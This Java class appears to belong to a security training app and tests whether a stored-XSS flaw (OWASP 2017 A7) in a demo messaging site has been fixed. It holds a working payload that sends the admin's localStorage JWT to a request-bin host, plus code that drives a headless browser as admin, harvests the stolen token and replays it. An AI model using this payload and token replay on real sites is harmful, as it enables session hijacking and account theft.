package thales.spring.angular.demo.remediation.owasp;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

import javax.servlet.http.HttpServletRequest;

import com.fasterxml.jackson.databind.ObjectMapper;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.openqa.selenium.By;
import org.openqa.selenium.NoSuchElementException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.firefox.FirefoxOptions;
import org.springframework.boot.web.client.RestTemplateBuilder;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestClientException;

import lombok.Getter;
import lombok.Setter;
import thales.spring.angular.demo.domain.Message;
import thales.spring.angular.demo.domain.MessageStatus;
import thales.spring.angular.demo.remediation.util.RemediationResponse;
import thales.spring.angular.demo.remediation.util.StaticUtils;
import thales.spring.angular.demo.remediation.util.TestsType;
import thales.spring.angular.demo.security.jwt.JwtTokenUtil;
import thales.spring.angular.demo.services.MessageService;
import thales.spring.angular.demo.util.I18n;

@Getter
@Setter
/**
 * Class with functions to test TOP A1 - Injections
 */
public class Top2017A7 extends TopOwaspGeneric {
    
	private final String API_REQUEST_BIN = "/api/v1/bins";
		
	private final String API_MESSAGE = "api/messages";
	private static final String PAYLOAD_XSS = "<img src=xss onerror=document.location=\"%s?token=\"+localStorage.getItem('token')>";;
        //Options to use firefox headless
    private FirefoxOptions options;
	
    public Top2017A7() {
        super(I18n.getMessage("msg.A7.name"));
        
		this.setOptions(new FirefoxOptions());
        this.getOptions().setHeadless(true);
    }
    
    /**
     * Check if vulnerability is corrected or not
     * @return 
     */
    public List<RemediationResponse> checkOperationalTests(HttpServletRequest request) {
    	List<RemediationResponse> remediations = new ArrayList<RemediationResponse>();
		
    	RemediationResponse remediation = check_A7_XSS(request);
    	if (remediation.getSuccess()) {
    		remediation = check_A7_XSS_EndPoint(remediation, request);
    	}
    	remediations.add(remediation);
    	return remediations;
    }
    
    /**
     * Check if vulnerability is always functional or not
     * @return 
     */
    public Boolean checkFunctionalTests(HttpServletRequest request) {
    	RemediationResponse remediation = createMessage(request, "FUNCTIONAL MESSAGE");
    	remediation.setTestsType(TestsType.FUNCTIONAL);
    	return remediation.getSuccess();
    }
    
    /**
	 * Checks XSS
	 */	
	public RemediationResponse check_A7_XSS(HttpServletRequest inputRequest) {
		
		LOGGER.info("---------------------------------------------------------------------------");
		LOGGER.info("----------------------- check_A7_XSS --------------------------------------");
		LOGGER.info("---------------------------------------------------------------------------");

		// Clean previous message (which could contain old payload)
		MessageService messageService= StaticUtils.getMessageService();
		messageService.deleteAll();

		String nameOfRemediation = I18n.getMessage("msg.A7.1.name");
		Boolean success = false;
		String comments = "";		
		String body = "";
        String cookies = "";
		String url = String.format("%s://%s:%d/",inputRequest.getScheme(),  inputRequest.getServerName(), 5000);
		
		String payload = I18n.getMessage("msg.A7.1.step1", url);

		RemediationResponse remediation = new RemediationResponse();		
		remediation.setName(nameOfRemediation);
		remediation.setPayload(payload);	
		remediation.setUrl(url);
		
		ResponseEntity<String> response;
		HttpMethod httpMethod = HttpMethod.GET;
		HttpHeaders headers = new HttpHeaders();	
		HttpEntity<String> entity = null;
	
		try {
			headers.add(HEADER_AUTHORIZATION, getAuthorization());
			entity = new HttpEntity<String>(null, headers);			
			response = restTemplate.exchange(url, httpMethod, entity, String.class);					
			cookies = response.getHeaders().get("Set-Cookie").stream().collect(Collectors.joining(";"));
			headers.set("Cookie", cookies);
			comments = I18n.getMessage("msg.A7.1.step1.response", url, true);
			remediation.setComments(comments);
		} catch (RestClientException e) {
			comments = e.toString();
			remediation.setComments(comments);
			return remediation;	
		}
		
		payload = I18n.getMessage("msg.A7.1.step2");
		entity = new HttpEntity<String>(null, headers);	
		remediation.setUrl(url + API_REQUEST_BIN);
		httpMethod = HttpMethod.POST;

		String endpoint = "";
			
		try {
			response = restTemplate.exchange(remediation.getUrl(), httpMethod, entity, String.class);	
			body = response.getBody();
			ObjectMapper mapper = new ObjectMapper();
			Map<String, String> map = mapper.readValue(body, Map.class);
			endpoint = map.get("name");			     			
		} catch (RestClientException | IOException e) {
			comments = e.toString();	
			remediation.setComments(comments);
			return remediation;
		}
		
		remediation.setUrl(url + endpoint);
		comments = "";
		String payloadXss = String.format(PAYLOAD_XSS, remediation.getUrl());
		payload = payloadXss;
		LOGGER.info("---------------------------------------------------------------------------");
		LOGGER.info("---------------- Create a message with a payload ---------------------------");
		LOGGER.info("---------------------------------------------------------------------------");
		remediation = createMessage(inputRequest, payloadXss);		
	
		if (remediation.getSuccess() != true) {
			remediation.setPayload(payload);
			return remediation;	
		}
		
		LOGGER.info("---------------------------------------------------------------------------");
		LOGGER.info("---------------- Read the message by the admin ----------------------------");
		LOGGER.info("---------------------------------------------------------------------------");
		payload = I18n.getMessage("msg.A7.1.step3");
		remediation = adminviewmessage();
		comments = remediation.getComments();
		
		if (remediation.getSuccess() != true) {
			remediation.setPayload(payload);
			remediation.setBody(remediation.getBody());
			return remediation;
		}
		
		success = true;
		//comments = I18n.getMessage("msg.A7.1.step4.comments");
		remediation.setName(I18n.getMessage("msg.A7.1.step4"));
		remediation.setUrl(url + endpoint + "?inspect");
		remediation.setComments(comments);		
		remediation.setPayload(payloadXss);
		remediation.setBody(remediation.getBody());
		remediation.setSuccess(success);
		return remediation;	
	}
	
	/**
	 * Checks XSS EndPoint
	 */	
	public RemediationResponse check_A7_XSS_EndPoint(RemediationResponse remediation, HttpServletRequest inputRequest) {
		
		LOGGER.info("---------------------------------------------------------------------------");
		LOGGER.info("----------------------- check_A7_XSS EndPoint-------------------------------");
		LOGGER.info("---------------------------------------------------------------------------");
		
		String nameOfRemediation = I18n.getMessage("msg.A7.2.name");
		Boolean success = true;
		String comments = "";				
		String payload = I18n.getMessage("msg.A7.1.step4");
		
		remediation.setName(nameOfRemediation);
		remediation.setPayload(payload);	
					
		remediation.setComments(I18n.getMessage("msg.A7.1.step4"));
		LOGGER.info("---------------------------------------------------------------------------");
		LOGGER.info("------- Inpect the Resquest bin : " + remediation.getUrl() + "-------------");
		LOGGER.info("---------------------------------------------------------------------------");
		
		HttpHeaders headers = new HttpHeaders();
		headers.add(HEADER_AUTHORIZATION, getAuthorization());

		HttpEntity<String> entity = new HttpEntity<String>(null, headers);
		ResponseEntity<String> response = null;
		try{
			response = restTemplate.exchange(remediation.getUrl(), HttpMethod.GET, entity, String.class);
		}catch (Exception e){
			LOGGER.error("Error", e);
		}

		String body = response.getBody();

		try {
			Document doc = Jsoup.connect(remediation.getUrl()).get();
			
			Elements elements = doc.select("span.querystring");
			body = "";
			for (Element e : elements) {				
				if (e.text().contains("token")) {
					body = e.text();
					String token = body.substring(body.indexOf("token=") + "token=".length());
					comments = token;
					headers = new HttpHeaders();
					headers.add(HEADER_AUTHORIZATION, "Bearer " + token);
					entity = new HttpEntity<String>(null, headers);
					String url = buildFrontEndPath(inputRequest, API_VERIFY);
					response = restTemplate.exchange(url, HttpMethod.GET, entity, String.class);
					if (response.getStatusCode().equals(HttpStatus.OK) && response.getBody().equals("OK")) {
						success = false;
					}
					break;
				}
			}
		} catch (IOException e) {
			comments = e.toString();
		}

		remediation.setPayload(payload);
		remediation.setSuccess(success);
		remediation.setComments(comments);
		remediation.setBody(body);
		return remediation;	
	}
	
	/**
	 * Create a message for a XSS Payload.
	 * @param inputRequest
	 * @param contentPayload
	 * @return
	 */
	private RemediationResponse createMessage(HttpServletRequest inputRequest, String contentPayload) {
		
		String nameOfRemediation =  I18n.getMessage("msg.A7.1.step5");
		Boolean success = false;
		String comments = "";
		
		RemediationResponse remediation = new RemediationResponse();		
		remediation.setName(nameOfRemediation);
		remediation.setPayload(contentPayload);		
		
		String url = buildFrontEndPath(inputRequest, API_MESSAGE);;
		
		Message message = new Message();
		message.setSubject("XSS for test remediation");
		message.setContent(contentPayload);
		message.setFrom(1L);
		message.setTo(2L);
		message.setRead(Boolean.FALSE);
		message.setStatus(MessageStatus.TOREPLY);
		
		HttpHeaders headers = new HttpHeaders();
		headers.add(HEADER_AUTHORIZATION, getAuthorization());
		HttpEntity<Message> entity = new HttpEntity<>(message, headers);

		ResponseEntity<String> response = restTemplate.exchange(url, HttpMethod.POST, entity, String.class);
		
		if (response.getStatusCode() == HttpStatus.CREATED) 
		{
			comments =  I18n.getMessage("msg.A7.1.step5.comments");
		} else {
			success = true;
		}

		String body = response.getBody();
		
		Pattern pattern = Pattern.compile(".*idMessage.*");
		Matcher matcher = pattern.matcher(body);
		boolean match = matcher.matches();
		if (match) {
			success = true;
		}
		remediation.setBody(body);
		remediation.setSuccess(success);
		remediation.setComments(comments);
		return remediation;
	}
	
	/**
	 * 
	 * @return the response of the request for http://localhost:4200/adminviewmessage
	 */
	private RemediationResponse adminviewmessage() {
		
		LOGGER.info("---------------------------------------------------------------------------");
		LOGGER.info("--------------------- check adminviewmessage -----------------------------");
		LOGGER.info("---------------------------------------------------------------------------");
		String nameOfRemediation = I18n.getMessage("msg.A7.1.step3");
		Boolean success = false;
		String comments = "";	
		
		String payload = I18n.getMessage("msg.A7.1.step3.payload");
		
		RemediationResponse remediation = new RemediationResponse();		
		remediation.setName(nameOfRemediation);
		remediation.setPayload(payload);		
			
		WebDriver driver = new FirefoxDriver(this.getOptions());
	    driver.get("http://localhost:4200");	
	    driver.manage().timeouts().implicitlyWait(15, TimeUnit.SECONDS);
	    driver.findElement (By.id ("FormEmailConnect")). sendKeys (ADMIN_EMAIL);
	    driver.findElement (By.id ("FormPasswordConnect")). sendKeys (ADMIN_PASSWORD);
	    
	    driver.findElement(By.cssSelector("button[type='submit']")).click();
	   
	    try {
			Thread.sleep(2000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	    
	    String url = "http://localhost:4200/adminviewmessage";
		String textprint= "";
	    try {		
		    driver.get(url);
		    driver.manage().timeouts().implicitlyWait(60, TimeUnit.SECONDS);
	    	textprint = driver.findElement(By.xpath("//body")).getText();	   
	    	success = true;
	    	comments = I18n.getMessage("ok.read.adminviewmessage");;
			LOGGER.info("---------------------  textprint " + textprint + " -----------------------------");
	    } catch (NoSuchElementException e1) {    	
	    	success = false;
	    	comments = I18n.getMessage("err.read.adminviewmessage") + " : " + driver.getPageSource();
	    }

	    driver.quit();		
	    remediation.setUrl(url);
	    remediation.setSuccess(success);
		remediation.setComments(comments);
		remediation.setBody(textprint);
		return remediation;
	}
}
